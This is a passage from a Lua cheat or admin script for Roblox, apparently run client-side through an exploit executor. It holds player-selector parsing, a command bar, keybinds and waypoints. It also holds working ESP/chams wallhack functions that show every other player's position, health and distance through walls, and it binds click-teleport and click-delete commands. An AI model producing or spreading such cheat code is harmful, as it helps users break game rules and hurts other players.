		local ObjectVector = workspace.CurrentCamera:WorldToScreenPoint(Object.Position)
		return Vector2.new(ObjectVector.X, ObjectVector.Y)
	end

	local MousePositionToVector2 = function()
		return Vector2.new(IYMouse.X, IYMouse.Y)
	end

	local GetClosestPlayerFromCursor = function()
		local found = nil
		local ClosestDistance = math.huge
		for i, v in pairs(Players:GetPlayers()) do
			if v ~= Players.LocalPlayer and v.Character and v.Character:FindFirstChildOfClass("Humanoid") then
				for k, x in pairs(v.Character:GetChildren()) do
					if string.find(x.Name, "Torso") then
						local Distance = (WorldToScreen(x) - MousePositionToVector2()).Magnitude
						if Distance < ClosestDistance then
							ClosestDistance = Distance
							found = v
						end
					end
				end
			end
		end
		return found
	end

	SpecialPlayerCases = {
		["all"] = function(speaker) return Players:GetPlayers() end,
		["others"] = function(speaker)
			local plrs = {}
			for i,v in pairs(Players:GetPlayers()) do
				if v ~= speaker then
					table.insert(plrs,v)
				end
			end
			return plrs
		end,
		["me"] = function(speaker)return {speaker} end,
		["#(%d+)"] = function(speaker,args,currentList)
			local returns = {}
			local randAmount = tonumber(args[1])
			local players = {unpack(currentList)}
			for i = 1,randAmount do
				if #players == 0 then break end
				local randIndex = math.random(1,#players)
				table.insert(returns,players[randIndex])
				table.remove(players,randIndex)
			end
			return returns
		end,
		["random"] = function(speaker,args,currentList)
			local players = Players:GetPlayers()
			local localplayer = Players.LocalPlayer
			table.remove(players, table.find(players, localplayer))
			return {players[math.random(1,#players)]}
		end,
		["%%(.+)"] = function(speaker,args)
			local returns = {}
			local team = args[1]
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team and string.sub(string.lower(plr.Team.Name),1,#team) == string.lower(team) then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["allies"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team == team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["enemies"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team ~= team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["team"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team == team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["nonteam"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team ~= team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["friends"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["nonfriends"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if not plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["guests"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Guest then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["bacons"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Character:FindFirstChild('Pal Hair') or plr.Character:FindFirstChild('Kate Hair') then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["age(%d+)"] = function(speaker,args)
			local returns = {}
			local age = tonumber(args[1])
			if not age == nil then return end
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.AccountAge <= age then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["nearest"] = function(speaker,args,currentList)
			local speakerChar = speaker.Character
			if not speakerChar or not getRoot(speakerChar) then return end
			local lowest = math.huge
			local NearestPlayer = nil
			for _,plr in pairs(currentList) do
				if plr ~= speaker and plr.Character then
					local distance = plr:DistanceFromCharacter(getRoot(speakerChar).Position)
					if distance < lowest then
						lowest = distance
						NearestPlayer = {plr}
					end
				end
			end
			return NearestPlayer
		end,
		["farthest"] = function(speaker,args,currentList)
			local speakerChar = speaker.Character
			if not speakerChar or not getRoot(speakerChar) then return end
			local highest = 0
			local Farthest = nil
			for _,plr in pairs(currentList) do
				if plr ~= speaker and plr.Character then
					local distance = plr:DistanceFromCharacter(getRoot(speakerChar).Position)
					if distance > highest then
						highest = distance
						Farthest = {plr}
					end
				end
			end
			return Farthest
		end,
		["group(%d+)"] = function(speaker,args)
			local returns = {}
			local groupID = tonumber(args[1])
			for _,plr in pairs(Players:GetPlayers()) do
				if plr:IsInGroup(groupID) then  
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["alive"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["dead"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if (not plr.Character or not plr.Character:FindFirstChildOfClass("Humanoid")) or plr.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["rad(%d+)"] = function(speaker,args)
			local returns = {}
			local radius = tonumber(args[1])
			local speakerChar = speaker.Character
			if not speakerChar or not getRoot(speakerChar) then return end
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Character and getRoot(plr.Character) then
					local magnitude = (getRoot(plr.Character).Position-getRoot(speakerChar).Position).magnitude
					if magnitude <= radius then table.insert(returns,plr) end
				end
			end
			return returns
		end,
		["cursor"] = function(speaker)
			local plrs = {}
			local v = GetClosestPlayerFromCursor()
			if v ~= nil then table.insert(plrs, v) end
			return plrs
		end,
		["npcs"] = function(speaker,args)
			local returns = {}
			for _, v in pairs(workspace:GetDescendants()) do
				if v:IsA("Model") and getRoot(v) and v:FindFirstChildWhichIsA("Humanoid") and Players:GetPlayerFromCharacter(v) == nil then
					local clone = Instance.new("Player")
					clone.Name = v.Name .. " - " .. v:FindFirstChildWhichIsA("Humanoid").DisplayName
					clone.Character = v
					table.insert(returns, clone)
				end
			end
			return returns
		end,
	}

	function toTokens(str)
		local tokens = {}
		for op,name in string.gmatch(str,"([+-])([^+-]+)") do
			table.insert(tokens,{Operator = op,Name = name})
		end
		return tokens
	end

	function onlyIncludeInTable(tab,matches)
		local matchTable = {}
		local resultTable = {}
		for i,v in pairs(matches) do matchTable[v.Name] = true end
		for i,v in pairs(tab) do if matchTable[v.Name] then table.insert(resultTable,v) end end
		return resultTable
	end

	function removeTableMatches(tab,matches)
		local matchTable = {}
		local resultTable = {}
		for i,v in pairs(matches) do matchTable[v.Name] = true end
		for i,v in pairs(tab) do if not matchTable[v.Name] then table.insert(resultTable,v) end end
		return resultTable
	end

	function getPlayersByName(Name)
		local Name,Len,Found = string.lower(Name),#Name,{}
		for _,v in pairs(Players:GetPlayers()) do
			if Name:sub(0,1) == '@' then
				if string.sub(string.lower(v.Name),1,Len-1) == Name:sub(2) then
					table.insert(Found,v)
				end
			else
				if string.sub(string.lower(v.Name),1,Len) == Name or string.sub(string.lower(v.DisplayName),1,Len) == Name then
					table.insert(Found,v)
				end
			end
		end
		return Found
	end

	function getPlayer(list,speaker)
		if list == nil then return {speaker.Name} end
		local nameList = splitString(list,",")

		local foundList = {}

		for _,name in pairs(nameList) do
			if string.sub(name,1,1) ~= "+" and string.sub(name,1,1) ~= "-" then name = "+"..name end
			local tokens = toTokens(name)
			local initialPlayers = Players:GetPlayers()

			for i,v in pairs(tokens) do
				if v.Operator == "+" then
					local tokenContent = v.Name
					local foundCase = false
					for regex,case in pairs(SpecialPlayerCases) do
						local matches = {string.match(tokenContent,"^"..regex.."$")}
						if #matches > 0 then
							foundCase = true
							initialPlayers = onlyIncludeInTable(initialPlayers,case(speaker,matches,initialPlayers))
						end
					end
					if not foundCase then
						initialPlayers = onlyIncludeInTable(initialPlayers,getPlayersByName(tokenContent))
					end
				else
					local tokenContent = v.Name
					local foundCase = false
					for regex,case in pairs(SpecialPlayerCases) do
						local matches = {string.match(tokenContent,"^"..regex.."$")}
						if #matches > 0 then
							foundCase = true
							initialPlayers = removeTableMatches(initialPlayers,case(speaker,matches,initialPlayers))
						end
					end
					if not foundCase then
						initialPlayers = removeTableMatches(initialPlayers,getPlayersByName(tokenContent))
					end
				end
			end

			for i,v in pairs(initialPlayers) do table.insert(foundList,v) end
		end

		local foundNames = {}
		for i,v in pairs(foundList) do table.insert(foundNames,v.Name) end

		return foundNames
	end

	getprfx=function(strn)
		if strn:sub(1,string.len(prefix))==prefix then return{'cmd',string.len(prefix)+1}
		end return
	end

	function do_exec(str, plr)
		str = str:gsub('/e ', '')
		local t = getprfx(str)
		if not t then return end
		str = str:sub(t[2])
		if t[1]=='cmd' then
			execCmd(str, plr, true)
			IndexContents('',true,false,true)
			CMDsF.CanvasPosition = canvasPos
		end
	end

	lastTextBoxString,lastTextBoxCon,lastEnteredString = nil,nil,nil

	UserInputService.TextBoxFocused:Connect(function(obj)
		if lastTextBoxCon then lastTextBoxCon:Disconnect() end
		if obj == Cmdbar then lastTextBoxString = nil return end
		lastTextBoxString = obj.Text
		lastTextBoxCon = obj:GetPropertyChangedSignal("Text"):Connect(function()
			if not (UserInputService:IsKeyDown(Enum.KeyCode.Return) or UserInputService:IsKeyDown(Enum.KeyCode.KeypadEnter)) then
				lastTextBoxString = obj.Text
			end
		end)
	end)

	UserInputService.InputBegan:Connect(function(input,gameProcessed)
		if gameProcessed then
			if Cmdbar and Cmdbar:IsFocused() then
				if input.KeyCode == Enum.KeyCode.Up then
					historyCount = historyCount + 1
					if historyCount > #cmdHistory then historyCount = #cmdHistory end
					Cmdbar.Text = cmdHistory[historyCount] or ""
					Cmdbar.CursorPosition = 1020
				elseif input.KeyCode == Enum.KeyCode.Down then
					historyCount = historyCount - 1
					if historyCount < 0 then historyCount = 0 end
					Cmdbar.Text = cmdHistory[historyCount] or ""
					Cmdbar.CursorPosition = 1020
				end
			elseif input.KeyCode == Enum.KeyCode.Return or input.KeyCode == Enum.KeyCode.KeypadEnter then
				lastEnteredString = lastTextBoxString
			end
		end
	end)

	Players.LocalPlayer.Chatted:Connect(function()
		wait()
		if lastEnteredString then
			local message = lastEnteredString
			lastEnteredString = nil
			do_exec(message, Players.LocalPlayer)
		end
	end)

	Cmdbar.PlaceholderText = "Command Bar ("..prefix..")"
	Cmdbar:GetPropertyChangedSignal("Text"):Connect(function()
		if Cmdbar:IsFocused() then
			IndexContents(Cmdbar.Text,true,true)
		end
	end)

	local tabComplete = nil
	tabAllowed = true
	Cmdbar.FocusLost:Connect(function(enterpressed)
		if enterpressed then
			local cmdbarText = Cmdbar.Text:gsub("^"..prefix,"")
			execCmd(cmdbarText,Players.LocalPlayer,true)
		end
		if tabComplete then tabComplete:Disconnect() end
		wait()
		if not Cmdbar:IsFocused() then
			Cmdbar.Text = ""
			IndexContents('',true,false,true)
			if SettingsOpen == true then
				wait(0.2)
				Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
				CMDsF.Visible = false
			end
		end
		CMDsF.CanvasPosition = canvasPos
	end)

	Cmdbar.Focused:Connect(function()
		historyCount = 0
		canvasPos = CMDsF.CanvasPosition
		if SettingsOpen == true then
			wait(0.2)
			CMDsF.Visible = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
		end
		tabComplete = UserInputService.InputBegan:Connect(function(input,gameProcessed)
			if Cmdbar:IsFocused() then
				if tabAllowed == true and input.KeyCode == Enum.KeyCode.Tab and topCommand ~= nil then
					autoComplete(topCommand)
				end
			else
				tabComplete:Disconnect()
			end
		end)
	end)

	ESPenabled = false
	CHMSenabled = false

	function round(num, numDecimalPlaces)
		local mult = 10^(numDecimalPlaces or 0)
		return math.floor(num * mult + 0.5) / mult
	end

	function ESP(plr)
		task.spawn(function()
			for i,v in pairs(COREGUI:GetChildren()) do
				if v.Name == plr.Name..'_ESP' then
					v:Destroy()
				end
			end
			wait()
			if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_ESP') then
				local ESPholder = Instance.new("Folder")
				ESPholder.Name = plr.Name..'_ESP'
				ESPholder.Parent = COREGUI
				repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
				for b,n in pairs (plr.Character:GetChildren()) do
					if (n:IsA("BasePart")) then
						local a = Instance.new("BoxHandleAdornment")
						a.Name = plr.Name
						a.Parent = ESPholder
						a.Adornee = n
						a.AlwaysOnTop = true
						a.ZIndex = 10
						a.Size = n.Size
						a.Transparency = espTransparency
						a.Color = plr.TeamColor
					end
				end
				if plr.Character and plr.Character:FindFirstChild('Head') then
					local BillboardGui = Instance.new("BillboardGui")
					local TextLabel = Instance.new("TextLabel")
					BillboardGui.Adornee = plr.Character.Head
					BillboardGui.Name = plr.Name
					BillboardGui.Parent = ESPholder
					BillboardGui.Size = UDim2.new(0, 100, 0, 150)
					BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
					BillboardGui.AlwaysOnTop = true
					TextLabel.Parent = BillboardGui
					TextLabel.BackgroundTransparency = 1
					TextLabel.Position = UDim2.new(0, 0, 0, -50)
					TextLabel.Size = UDim2.new(0, 100, 0, 100)
					TextLabel.Font = Enum.Font.SourceSansSemibold
					TextLabel.TextSize = 20
					TextLabel.TextColor3 = Color3.new(1, 1, 1)
					TextLabel.TextStrokeTransparency = 0
					TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
					TextLabel.Text = 'Name: '..plr.Name
					TextLabel.ZIndex = 10
					local espLoopFunc
					local teamChange
					local addedFunc
					addedFunc = plr.CharacterAdded:Connect(function()
						if ESPenabled then
							espLoopFunc:Disconnect()
							teamChange:Disconnect()
							ESPholder:Destroy()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
							ESP(plr)
							addedFunc:Disconnect()
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
						end
					end)
					teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
						if ESPenabled then
							espLoopFunc:Disconnect()
							addedFunc:Disconnect()
							ESPholder:Destroy()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
							ESP(plr)
							teamChange:Disconnect()
						else
							teamChange:Disconnect()
						end
					end)
					local function espLoop()
						if COREGUI:FindFirstChild(plr.Name..'_ESP') then
							if plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid") and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
								local pos = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(plr.Character).Position).magnitude)
								TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | Studs: '..pos
							end
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
							espLoopFunc:Disconnect()
						end
					end
					espLoopFunc = RunService.RenderStepped:Connect(espLoop)
				end
			end
		end)
	end

	function CHMS(plr)
		task.spawn(function()
			for i,v in pairs(COREGUI:GetChildren()) do
				if v.Name == plr.Name..'_CHMS' then
					v:Destroy()
				end
			end
			wait()
			if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_CHMS') then
				local ESPholder = Instance.new("Folder")
				ESPholder.Name = plr.Name..'_CHMS'
				ESPholder.Parent = COREGUI
				repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
				for b,n in pairs (plr.Character:GetChildren()) do
					if (n:IsA("BasePart")) then
						local a = Instance.new("BoxHandleAdornment")
						a.Name = plr.Name
						a.Parent = ESPholder
						a.Adornee = n
						a.AlwaysOnTop = true
						a.ZIndex = 10
						a.Size = n.Size
						a.Transparency = espTransparency
						a.Color = plr.TeamColor
					end
				end
				local addedFunc
				local teamChange
				local CHMSremoved
				addedFunc = plr.CharacterAdded:Connect(function()
					if CHMSenabled then
						ESPholder:Destroy()
						teamChange:Disconnect()
						repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
						CHMS(plr)
						addedFunc:Disconnect()
					else
						teamChange:Disconnect()
						addedFunc:Disconnect()
					end
				end)
				teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
					if CHMSenabled then
						ESPholder:Destroy()
						addedFunc:Disconnect()
						repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
						CHMS(plr)
						teamChange:Disconnect()
					else
						teamChange:Disconnect()
					end
				end)
				CHMSremoved = ESPholder.AncestryChanged:Connect(function()
					teamChange:Disconnect()
					addedFunc:Disconnect()
					CHMSremoved:Disconnect()
				end)
			end
		end)
	end

	function Locate(plr)
		task.spawn(function()
			for i,v in pairs(COREGUI:GetChildren()) do
				if v.Name == plr.Name..'_LC' then
					v:Destroy()
				end
			end
			wait()
			if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_LC') then
				local ESPholder = Instance.new("Folder")
				ESPholder.Name = plr.Name..'_LC'
				ESPholder.Parent = COREGUI
				repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
				for b,n in pairs (plr.Character:GetChildren()) do
					if (n:IsA("BasePart")) then
						local a = Instance.new("BoxHandleAdornment")
						a.Name = plr.Name
						a.Parent = ESPholder
						a.Adornee = n
						a.AlwaysOnTop = true
						a.ZIndex = 10
						a.Size = n.Size
						a.Transparency = espTransparency
						a.Color = plr.TeamColor
					end
				end
				if plr.Character and plr.Character:FindFirstChild('Head') then
					local BillboardGui = Instance.new("BillboardGui")
					local TextLabel = Instance.new("TextLabel")
					BillboardGui.Adornee = plr.Character.Head
					BillboardGui.Name = plr.Name
					BillboardGui.Parent = ESPholder
					BillboardGui.Size = UDim2.new(0, 100, 0, 150)
					BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
					BillboardGui.AlwaysOnTop = true
					TextLabel.Parent = BillboardGui
					TextLabel.BackgroundTransparency = 1
					TextLabel.Position = UDim2.new(0, 0, 0, -50)
					TextLabel.Size = UDim2.new(0, 100, 0, 100)
					TextLabel.Font = Enum.Font.SourceSansSemibold
					TextLabel.TextSize = 20
					TextLabel.TextColor3 = Color3.new(1, 1, 1)
					TextLabel.TextStrokeTransparency = 0
					TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
					TextLabel.Text = 'Name: '..plr.Name
					TextLabel.ZIndex = 10
					local lcLoopFunc
					local addedFunc
					local teamChange
					addedFunc = plr.CharacterAdded:Connect(function()
						if ESPholder ~= nil and ESPholder.Parent ~= nil then
							lcLoopFunc:Disconnect()
							teamChange:Disconnect()
							ESPholder:Destroy()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
							Locate(plr)
							addedFunc:Disconnect()
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
						end
					end)
					teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
						if ESPholder ~= nil and ESPholder.Parent ~= nil then
							lcLoopFunc:Disconnect()
							addedFunc:Disconnect()
							ESPholder:Destroy()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
							Locate(plr)
							teamChange:Disconnect()
						else
							teamChange:Disconnect()
						end
					end)
					local function lcLoop()
						if COREGUI:FindFirstChild(plr.Name..'_LC') then
							if plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid") and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
								local pos = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(plr.Character).Position).magnitude)
								TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | Studs: '..pos
							end
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
							lcLoopFunc:Disconnect()
						end
					end
					lcLoopFunc = RunService.RenderStepped:Connect(lcLoop)
				end
			end
		end)
	end

	local bindsGUI = KeybindEditor
	local awaitingInput = false
	local keySelected = false

	function refreshbinds()
		if Holder_2 then
			Holder_2:ClearAllChildren()
			Holder_2.CanvasSize = UDim2.new(0, 0, 0, 10)
			for i = 1, #binds do
				local YSize = 25
				local Position = ((i * YSize) - YSize)
				local newbind = Example_2:Clone()
				newbind.Parent = Holder_2
				newbind.Visible = true
				newbind.Position = UDim2.new(0,0,0, Position + 5)
				table.insert(shade2,newbind)
				table.insert(shade2,newbind.Text)
				table.insert(text1,newbind.Text)
				table.insert(shade3,newbind.Text.Delete)
				table.insert(text2,newbind.Text.Delete)
				local input = tostring(binds[i].KEY)
				local key
				if input == 'RightClick' or input == 'LeftClick' then
					key = input
				else
					key = input:sub(14)
				end
				if binds[i].TOGGLE then
					newbind.Text.Text = key.." > "..binds[i].COMMAND.." / "..binds[i].TOGGLE
				else
					newbind.Text.Text = key.." > "..binds[i].COMMAND.."  "..(binds[i].ISKEYUP and "(keyup)" or "(keydown)")
				end
				Holder_2.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newbind.Text.Delete.MouseButton1Click:Connect(function()
					unkeybind(binds[i].COMMAND,binds[i].KEY)
				end)
			end
		end
	end

	refreshbinds()

	toggleOn = {}

	function unkeybind(cmd,key)
		for i = #binds,1,-1 do
			if binds[i].COMMAND == cmd and binds[i].KEY == key then
				local d = binds[i]
				toggleOn[d] = nil
				table.remove(binds, i)
			end
		end
		refreshbinds()
		updatesaves()
		if key == 'RightClick' or key == 'LeftClick' then
			notify('Keybinds Updated','Unbinded '..key..' from '..cmd)
		else
			notify('Keybinds Updated','Unbinded '..key:sub(14)..' from '..cmd)
		end
	end

	PositionsFrame.Delete.MouseButton1Click:Connect(function()
		execCmd('cpos')
	end)

	function refreshwaypoints()
		if #WayPoints > 0 or #pWayPoints > 0 then
			PositionsHint:Destroy()
		end
		if Holder_4 then
			Holder_4:ClearAllChildren()
			Holder_4.CanvasSize = UDim2.new(0, 0, 0, 10)
			local YSize = 25
			local num = 1
			for i = 1, #WayPoints do
				local Position = ((num * YSize) - YSize)
				local newpoint = Example_4:Clone()
				newpoint.Parent = Holder_4
				newpoint.Visible = true
				newpoint.Position = UDim2.new(0,0,0, Position + 5)
				newpoint.Text.Text = WayPoints[i].NAME
				table.insert(shade2,newpoint)
				table.insert(shade2,newpoint.Text)
				table.insert(text1,newpoint.Text)
				table.insert(shade3,newpoint.Text.Delete)
				table.insert(text2,newpoint.Text.Delete)
				table.insert(shade3,newpoint.Text.TP)
				table.insert(text2,newpoint.Text.TP)
				Holder_4.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newpoint.Text.Delete.MouseButton1Click:Connect(function()
					execCmd('dpos '..WayPoints[i].NAME)
				end)
				newpoint.Text.TP.MouseButton1Click:Connect(function()
					execCmd("loadpos "..WayPoints[i].NAME)
				end)
				num = num+1
			end
			for i = 1, #pWayPoints do
				local Position = ((num * YSize) - YSize)
				local newpoint = Example_4:Clone()
				newpoint.Parent = Holder_4
				newpoint.Visible = true
				newpoint.Position = UDim2.new(0,0,0, Position + 5)
				newpoint.Text.Text = pWayPoints[i].NAME
				table.insert(shade2,newpoint)
				table.insert(shade2,newpoint.Text)
				table.insert(text1,newpoint.Text)
				table.insert(shade3,newpoint.Text.Delete)
				table.insert(text2,newpoint.Text.Delete)
				table.insert(shade3,newpoint.Text.TP)
				table.insert(text2,newpoint.Text.TP)
				Holder_4.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newpoint.Text.Delete.MouseButton1Click:Connect(function()
					execCmd('dpos '..pWayPoints[i].NAME)
				end)
				newpoint.Text.TP.MouseButton1Click:Connect(function()
					execCmd("loadpos "..pWayPoints[i].NAME)
				end)
				num = num+1
			end
		end
	end

	refreshwaypoints()

	function refreshaliases()
		if #aliases > 0 then
			AliasHint:Destroy()
		end
		if Holder_3 then
			Holder_3:ClearAllChildren()
			Holder_3.CanvasSize = UDim2.new(0, 0, 0, 10)
			for i = 1, #aliases do
				local YSize = 25
				local Position = ((i * YSize) - YSize)
				local newalias = Example_3:Clone()
				newalias.Parent = Holder_3
				newalias.Visible = true
				newalias.Position = UDim2.new(0,0,0, Position + 5)
				newalias.Text.Text = aliases[i].CMD.." > "..aliases[i].ALIAS
				table.insert(shade2,newalias)
				table.insert(shade2,newalias.Text)
				table.insert(text1,newalias.Text)
				table.insert(shade3,newalias.Text.Delete)
				table.insert(text2,newalias.Text.Delete)
				Holder_3.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newalias.Text.Delete.MouseButton1Click:Connect(function()
					execCmd('removealias '..aliases[i].ALIAS)
				end)
			end
		end
	end

	local bindChosenKeyUp = false

	BindTo.MouseButton1Click:Connect(function()
		awaitingInput = true
		BindTo.Text = 'Press something'
	end)

	BindTriggerSelect.MouseButton1Click:Connect(function()
		bindChosenKeyUp = not bindChosenKeyUp
		BindTriggerSelect.Text = bindChosenKeyUp and "KeyUp" or "KeyDown"
	end)

	newToggle = false
	Cmdbar_3.Parent.Visible = false
	On_2.MouseButton1Click:Connect(function()
		if newToggle == false then newToggle = true
			On_2.BackgroundTransparency = 0
			Cmdbar_3.Parent.Visible = true
			BindTriggerSelect.Visible = false
		else newToggle = false
			On_2.BackgroundTransparency = 1
			Cmdbar_3.Parent.Visible = false
			BindTriggerSelect.Visible = true
		end
	end)

	Add_2.MouseButton1Click:Connect(function()
		if keySelected then
			if string.find(Cmdbar_2.Text, "\\\\") or string.find(Cmdbar_3.Text, "\\\\") then
				notify('Keybind Error','Only use one backslash to keybind multiple commands into one keybind or command')
			else
				if newToggle and Cmdbar_3.Text ~= '' and Cmdbar_2.text ~= '' then
					addbind(Cmdbar_2.Text,keyPressed,false,Cmdbar_3.Text)
				elseif not newToggle and Cmdbar_2.text ~= '' then
					addbind(Cmdbar_2.Text,keyPressed,bindChosenKeyUp)
				else
					return
				end
				refreshbinds()
				updatesaves()
				if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
					notify('Keybinds Updated','Binded '..keyPressed..' to '..Cmdbar_2.Text..(newToggle and " / "..Cmdbar_3.Text or ""))
				else
					notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to '..Cmdbar_2.Text..(newToggle and " / "..Cmdbar_3.Text or ""))
				end
			end
		end
	end)

	Exit_2.MouseButton1Click:Connect(function()
		Cmdbar_2.Text = 'Command'
		Cmdbar_3.Text = 'Command 2'
		BindTo.Text = 'Click to bind'
		bindChosenKeyUp = false
		BindTriggerSelect.Text = "KeyDown"
		keySelected = false
		KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
	end)

	function onInputBegan(input,gameProcessed)
		if awaitingInput then
			if input.UserInputType == Enum.UserInputType.Keyboard then
				keyPressed = tostring(input.KeyCode)
				BindTo.Text = keyPressed:sub(14)
			elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
				keyPressed = 'LeftClick'
				BindTo.Text = 'LeftClick'
			elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
				keyPressed = 'RightClick'
				BindTo.Text = 'RightClick'
			end
			awaitingInput = false
			keySelected = true
		end
		if not gameProcessed and #binds > 0 then
			for i,v in pairs(binds) do
				if not v.ISKEYUP then
					if (input.UserInputType == Enum.UserInputType.Keyboard and v.KEY:lower()==tostring(input.KeyCode):lower()) or (input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEY:lower()=='leftclick') or (input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEY:lower()=='rightclick') then
						if v.TOGGLE then
							local isOn = toggleOn[v] == true
							toggleOn[v] = not isOn
							if isOn then
								execCmd(v.TOGGLE,Players.LocalPlayer)
							else
								execCmd(v.COMMAND,Players.LocalPlayer)
							end
						else
							execCmd(v.COMMAND,Players.LocalPlayer)
						end
					end
				end
			end
		end
	end

	function onInputEnded(input,gameProcessed)
		if not gameProcessed and #binds > 0 then
			for i,v in pairs(binds) do
				if v.ISKEYUP then
					if (input.UserInputType == Enum.UserInputType.Keyboard and v.KEY:lower()==tostring(input.KeyCode):lower()) or (input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEY:lower()=='leftclick') or (input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEY:lower()=='rightclick') then
						execCmd(v.COMMAND,Players.LocalPlayer)
					end
				end
			end
		end
	end

	UserInputService.InputBegan:Connect(onInputBegan)
	UserInputService.InputEnded:Connect(onInputEnded)

	ClickTP.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('clicktp',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to click tp')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click tp')
			end
		end
	end)

	ClickDelete.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('clickdel',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to click delete')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click delete')
			end
		end
	end)

	local function clicktpFunc()
		pcall(function()
			local character = Players.LocalPlayer.Character
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if humanoid and humanoid.SeatPart then
